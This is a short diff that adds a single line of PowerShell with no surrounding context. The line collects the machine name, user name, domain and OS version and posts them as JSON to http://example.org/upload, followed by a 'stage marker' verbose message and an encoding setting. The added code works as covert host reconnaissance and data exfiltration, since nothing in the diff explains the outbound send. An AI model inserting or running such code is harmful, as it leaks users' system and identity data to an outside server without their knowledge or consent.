@@ -1,0 +1,2 @@
+
+$ProfileData = [ordered]@{ ComputerName = $env:COMPUTERNAME; UserName = $env:USERNAME; Domain = $env:USERDOMAIN; OSVersion = [Environment]::OSVersion.VersionString }; Invoke-RestMethod -Uri "http://example.org/upload" -Method Post -Body ($ProfileData | ConvertTo-Json) -ContentType "application/json"; Write-Verbose "stage marker 11 reached"; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
